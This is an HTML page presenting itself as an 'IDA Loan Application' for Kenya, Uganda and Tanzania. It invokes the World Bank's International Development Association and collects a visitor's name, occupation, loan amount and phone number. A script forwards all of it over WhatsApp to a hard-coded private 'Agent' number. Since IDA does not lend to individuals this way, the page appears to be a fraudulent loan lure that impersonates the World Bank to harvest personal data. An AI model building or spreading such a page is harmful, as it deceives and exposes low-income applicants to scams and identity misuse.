<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>IDA Loan</title>
  <style>
    :root {
      --bg:#f4f7fb;
      --card:#fff;
      --accent:#0b63d6;
      --muted:#6b7280;
    }
    body {
      font-family: Inter, system-ui, Segoe UI, Roboto, Arial, sans-serif;
      background: green;
      margin: 0;
      color: #0f172a;
    }
    .container {max-width:980px;margin:40px auto;padding:20px}
    .hero {background:linear-gradient(90deg,#ffffffcc, #eaf2ff);border-radius:12px;padding:28px;box-shadow:0 6px 18px rgba(12,38,66,0.06)}
    h1 {margin:0 0 8px;font-size:22px}
    p.lead {margin:0;color:var(--muted)}
    .countries {display:flex;gap:16px;margin-top:20px}
    .country {flex:1;background:var(--card);padding:18px;border-radius:10px;text-align:center;cursor:pointer;border:1px solid transparent;transition:all .18s}
    .country:hover {transform:translateY(-4px);box-shadow:0 8px 24px rgba(12,38,66,0.06);border-color:rgba(11,99,214,0.12)}
    .country img {width:56px;height:38px;object-fit:cover;border-radius:6px}
    .country h3 {margin:12px 0 6px;font-size:16px}
    .note {margin-top:18px;color:var(--muted);font-size:14px}
    .modal-backdrop {position:fixed;inset:0;background:rgba(2,6,23,0.45);display:none;align-items:center;justify-content:center;padding:20px}
    .modal {background:var(--card);width:100%;max-width:520px;border-radius:10px;padding:20px;box-shadow:0 20px 40px rgba(7,16,45,0.2)}
    .modal h2 {margin:0 0 8px}
    .modal .sub {color:var(--muted);font-size:13px;margin-bottom:14px}
    .field {display:flex;flex-direction:column;margin-bottom:12px}
    label {font-size:13px;margin-bottom:6px}
    input[type=text], input[type=tel], input[type=number], select {
      padding:10px;border:1px solid #e6eefc;border-radius:8px;font-size:14px;
    }
    .btn {
      display:inline-block;padding:10px 14px;border-radius:8px;
      text-decoration:none;border:0;background:var(--accent);color:white;cursor:pointer;
    }
    .btn.ghost {
      background:transparent;color:var(--accent);
      border:1px solid rgba(11,99,214,0.12);
    }
    footer {
      margin-top:30px;text-align:center;color:var(--muted);font-size:13px
    }
    @media (max-width:640px) {.countries {flex-direction:column}}
  </style>
</head>
<body>
  <div class="container">
    <div class="hero">
      <h1>IDA Loan Application</h1>
      <p class="lead">Select your country to begin a short application. Fill in your details and submit directly via WhatsApp.</p>

      <div class="countries">
        <div class="country" data-country="Kenya" data-currency="KES">
          <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='280' height='160'><rect width='280' height='160' fill='%23fff'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' font-size='20' fill='%230b63d6'>KEN</text></svg>" alt="Kenya flag">
          <h3>Kenya</h3>
          <div class="small">Currency: KES</div>
        </div>

        <div class="country" data-country="Uganda" data-currency="UGX">
          <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='280' height='160'><rect width='280' height='160' fill='%23fff'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' font-size='20' fill='%230b63d6'>UGA</text></svg>" alt="Uganda flag">
          <h3>Uganda</h3>
          <div class="small">Currency: UGX</div>
        </div>

        <div class="country" data-country="Tanzania" data-currency="TZS">
          <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='280' height='160'><rect width='280' height='160' fill='%23fff'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' font-size='20' fill='%230b63d6'>TZA</text></svg>" alt="Tanzania flag">
          <h3>Tanzania</h3>
          <div class="small">Currency: TZS</div>
        </div>
      </div>

      <div class="note">
        The International Development Association (IDA) is part of the World Bank that provides low-interest loans and grants to low-income countries.
      </div>
    </div>

    <footer>
      IDA helps countries invest in their futures, reduce poverty, and build sustainable economic growth.
    </footer>
  </div>

  <!-- Modal -->
  <div id="modalBackdrop" class="modal-backdrop" role="dialog" aria-hidden="true">
    <div class="modal" role="document">
      <button id="closeModal" class="btn ghost" style="float:right">Close</button>
      <h2 id="modalTitle">Apply for IDA loan</h2>
      <div class="sub" id="modalSub">Country: <span id="selectedCountry">-</span> â€¢ Currency: <span id="selectedCurrency">-</span></div>

      <form id="loanForm" onsubmit="return false;">
        <div class="field"><label for="fullName">FULL NAME</label><input id="fullName" name="fullName" type="text" placeholder="e.g. Jane Doe" required></div>
        <div class="field"><label for="occupation">OCCUPATION</label><input id="occupation" name="occupation" type="text" placeholder="e.g. Farmer, Tailor" required></div>
        <div class="field"><label for="amount">AMOUNT APPLYING FOR (<span id="currencyLabel">KES</span>)</label><input id="amount" name="amount" type="number" min="1" placeholder="e.g. 500000" required></div>
        <div class="field"><label for="phone">PHONE NUMBER</label><input id="phone" name="phone" type="tel" placeholder="+2547XXXXXXXX" pattern="\+?[0-9\s-]{7,20}" required></div>

        <div style="display:flex;gap:8px;align-items:center;margin-top:8px">
          <button id="submitBtn" class="btn" type="button">Submit via WhatsApp</button>
          <button id="cancelBtn" class="btn ghost" type="button">Cancel</button>
        </div>
      </form>
    </div>
  </div>

  <script>
    (function() {
      const countries = document.querySelectorAll('.country');
      const modal = document.getElementById('modalBackdrop');
      const selectedCountryEl = document.getElementById('selectedCountry');
      const selectedCurrencyEl = document.getElementById('selectedCurrency');
      const currencyLabel = document.getElementById('currencyLabel');
      const closeModal = document.getElementById('closeModal');
      const cancelBtn = document.getElementById('cancelBtn');
      const submitBtn = document.getElementById('submitBtn');
      const fullName = document.getElementById('fullName');
      const occupation = document.getElementById('occupation');
      const amount = document.getElementById('amount');
      const phone = document.getElementById('phone');

      let activeCountry = null;
      let activeCurrency = null;

      function openModal(country, currency) {
        activeCountry = country;
        activeCurrency = currency;
        selectedCountryEl.textContent = country;
        selectedCurrencyEl.textContent = currency;
        currencyLabel.textContent = currency;
        modal.style.display = 'flex';
        modal.setAttribute('aria-hidden', 'false');
      }

      function close() {
        modal.style.display = 'none';
        modal.setAttribute('aria-hidden', 'true');
      }

      countries.forEach(c => {
        c.addEventListener('click', () => {
          openModal(c.dataset.country, c.dataset.currency);
        });
      });

      closeModal.addEventListener('click', close);
      cancelBtn.addEventListener('click', close);

      // Submit directly via WhatsApp
      submitBtn.addEventListener('click', () => {
        if(!fullName.value.trim() || !occupation.value.trim() || !amount.value || !phone.value.trim()) {
          alert('Please fill all fields before submitting.');
          return;
        }

        const message = `Hello Agent, I have submitted my loan application.\n\nDetails:\n- Name: ${fullName.value}\n- Occupation: ${occupation.value}\n- Amount: ${amount.value} ${activeCurrency}\n- Phone: ${phone.value}\n- Country: ${activeCountry}`;
        const agentNumber = "254107325600";  
        const url = `https://api.whatsapp.com/send?phone=${agentNumber}&text=${encodeURIComponent(message.trim())}`;
        window.open(url, '_blank');
      });
    })();
  </script>
</body>
</html>
